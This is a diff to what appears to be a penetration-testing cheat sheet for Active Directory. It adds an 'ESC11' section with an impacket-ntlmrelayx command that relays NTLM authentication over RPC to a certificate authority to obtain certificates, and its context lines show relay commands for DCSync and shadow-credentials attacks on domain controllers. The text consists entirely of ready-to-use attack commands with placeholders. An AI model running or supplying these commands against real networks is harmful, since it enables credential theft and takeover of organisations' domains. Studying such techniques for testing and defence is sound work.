@@ -92,3 +92,8 @@ impacket-ntlmrelayx -t dcsync://'<DOMAINCONTROLLER>' -auth-smb '<DOMAIN>'/'<LOW_
 ```
 impacket-ntlmrelayx -t ldap://<dc02> --shadow-credentials --shadow-target '<dc01>$'
 ```
+
+## ntlmrelay - ESC11 
+```
+impacket-ntlmrelayx -t rpc://$PKI.<domain> -rpc-mode ICPR -icpr-ca-name <CA_NAME> -smb2support --template "<Template name>"
+```
